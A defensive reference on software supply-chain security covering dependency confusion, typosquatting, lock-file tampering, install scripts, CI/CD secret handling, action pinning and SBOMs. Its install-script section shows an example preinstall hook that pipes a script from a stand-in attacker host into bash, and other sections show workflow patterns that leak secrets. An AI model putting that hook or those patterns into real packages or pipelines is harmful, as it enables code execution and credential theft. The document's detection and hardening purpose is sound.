# Supply Chain Security Reference

> **Sources:**
> - SLSA framework levels referenced from [SLSA (Supply-chain Levels for Software Artifacts)](https://slsa.dev/) by [Google and the Open Source Security Foundation](https://slsa.dev/spec/v1.0/about).
> - SBOM guidance based on [CycloneDX](https://cyclonedx.org/) and industry best practices.

Covers dependency-level, build pipeline, and artifact integrity threats. Load this reference when reviewing `package.json`, lock files, CI/CD configs, or dependency management code.

## Dependency Confusion

Attacker publishes a malicious public package with the same name as a private/internal package. Package managers may prefer the public version if registries aren't configured correctly.

### Detection

```json
// VULNERABLE: No registry scoping for internal packages
{
  "dependencies": {
    "@company/auth-utils": "^1.0.0"  // Could resolve from public npm if .npmrc is misconfigured
  }
}
```

### Prevention

```ini
# .npmrc — Always scope private packages to internal registry
@company:registry=https://npm.company.com/
//npm.company.com/:_authToken=${NPM_TOKEN}

# Lock to specific registries
registry=https://registry.npmjs.org/
```

```yaml
# Yarn .yarnrc.yml
npmScopes:
  company:
    npmRegistryServer: "https://npm.company.com/"
    npmAuthToken: "${NPM_TOKEN}"
```

### What to Check

- `.npmrc` / `.yarnrc.yml` — Are private scopes configured with explicit registry URLs?
- Are internal package names scoped (`@company/pkg`) or unscoped (higher risk)?
- Does CI use a different `.npmrc` than local dev (common misconfiguration)?

## Typosquatting

Attacker publishes packages with names similar to popular ones (e.g., `lodahs` instead of `lodash`).

### Detection Heuristics

- Package name differs by 1-2 characters from a popular package
- Very new package (published recently) with low download count
- Package name uses common misspellings or character swaps
- Single-maintainer packages mimicking well-known org packages

### Known Attack Patterns

| Technique | Example |
|-----------|---------|
| Character swap | `axois` → `axios` |
| Missing character | `reac` → `react` |
| Extra character | `expresss` → `express` |
| Homoglyph | `ℓodash` → `lodash` (Unicode) |
| Scope confusion | `@types-node/core` → `@types/node` |

### What to Check

- Review `package.json` additions in PRs (especially unfamiliar packages)
- Check package publish date and maintainer count on npm
- Verify package names against known registries before adding

## Lock File Integrity

Lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) pin exact dependency versions and integrity hashes. Tampering can introduce malicious packages.

### Detection

```bash
# Check for lock file changes without corresponding package.json changes
# In CI: fail if lock file is out of sync
npm ci          # Strict install from lock file (fails on mismatch)
yarn --frozen-lockfile
pnpm install --frozen-lockfile
```

### What to Check

- Lock file modified without `package.json` changes → suspicious
- Integrity hashes changed for existing packages → tampering
- New `resolved` URLs pointing to unexpected registries
- PR that modifies lock file manually (should be auto-generated)

### Prevention

```yaml
# GitHub Actions: enforce frozen installs
- run: npm ci
  # NOT: npm install (which can modify lock file)
```

## Install Scripts

`preinstall`, `postinstall`, and `prepare` scripts run automatically during `npm install` and can execute arbitrary code.

### Detection

```json
// Check package.json of dependencies for:
{
  "scripts": {
    "preinstall": "curl https://evil.com/payload.sh | bash",
    "postinstall": "node ./setup.js"  // Inspect setup.js contents
  }
}
```

### Suspicious Indicators

- `preinstall` / `postinstall` scripts that:
  - Download external files (`curl`, `wget`, `fetch`)
  - Execute shell commands (`exec`, `child_process`)
  - Access environment variables (stealing CI secrets)
  - Write to files outside `node_modules`
  - Minified or obfuscated code in install scripts

### Prevention

```bash
# Audit install scripts before adding dependencies
npm explain <package>
npm pack <package> && tar -xzf <package>.tgz  # Inspect contents

# Disable scripts for untrusted packages
npm install --ignore-scripts
# Then selectively run trusted scripts
npx allow-scripts
```

```ini
# .npmrc — Ignore scripts by default
ignore-scripts=true
```

### What to Check

- New dependencies with `postinstall` scripts
- `postinstall` scripts in transitive dependencies
- Scripts that access `process.env` (potential secret exfiltration)

## CI/CD Pipeline Security

Build pipelines have access to secrets, deployment credentials, and artifact registries — making them high-value targets.

### Secret Exposure

```yaml
# VULNERABLE: Secret in command output
- run: echo "Token is ${{ secrets.DEPLOY_TOKEN }}"

# VULNERABLE: Secret in artifact
- run: echo "${{ secrets.API_KEY }}" > config.json
- uses: actions/upload-artifact@v4
  with:
    path: config.json  # Secret now in downloadable artifact

# VULNERABLE: Secret in PR-triggered workflow from fork
on:
  pull_request_target:
    types: [opened]
# Fork PRs can modify workflow code that runs with repo secrets
```

### Action/Step Pinning

```yaml
# VULNERABLE: Mutable tag (author could push malicious update)
- uses: actions/checkout@v4

# SAFE: Pinned to exact commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# Also check third-party actions from unknown authors
- uses: random-user/deploy-action@main  # HIGH RISK: mutable ref from unknown source
```

### Artifact Integrity

```yaml
# SLSA Level 1: Build process is documented
# SLSA Level 2: Build service generates provenance
# SLSA Level 3: Build service is hardened

# Generate provenance for published packages
- uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.1.0
```

### What to Check

- Secrets referenced in `echo`, `cat`, or artifact upload steps
- Unpinned action versions (should use SHA, not tag)
- `pull_request_target` trigger with checkout of PR code
- Workflows triggered by forks that access secrets
- Self-hosted runners with persistent state between jobs
- `GITHUB_TOKEN` permissions (should be minimal, not default `write-all`)

```yaml
# GOOD: Minimal permissions
permissions:
  contents: read
  pull-requests: write

# BAD: Overly permissive
permissions: write-all
```

## SBOM (Software Bill of Materials)

An inventory of all software components, useful for vulnerability tracking and license compliance.

### Generation

```bash
# npm/Node.js
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Syft (multi-ecosystem)
syft . -o cyclonedx-json > sbom.json

# GitHub auto-generates dependency graph
# Settings → Code security and analysis → Dependency graph
```

### What to Check

- Is SBOM generation part of CI/CD pipeline?
- Are dependencies tracked for known vulnerabilities (Dependabot, Snyk, Renovate)?
- Is there a process for responding to CVE notifications?
- Are license compliance requirements met?

## Audit Checklist

| Area | Check |
|------|-------|
| **Registry config** | Private scopes mapped to internal registry |
| **Lock files** | Frozen installs in CI, integrity hashes present |
| **Install scripts** | Audited for new dependencies, no external downloads |
| **Action pinning** | All actions use SHA pins, not mutable tags |
| **Secret handling** | No secrets in logs, artifacts, or fork-accessible workflows |
| **Permissions** | `GITHUB_TOKEN` and IAM roles follow least privilege |
| **Dependency updates** | Automated scanning (Dependabot/Renovate/Snyk) enabled |
| **SBOM** | Generated in CI, dependencies tracked for CVEs |
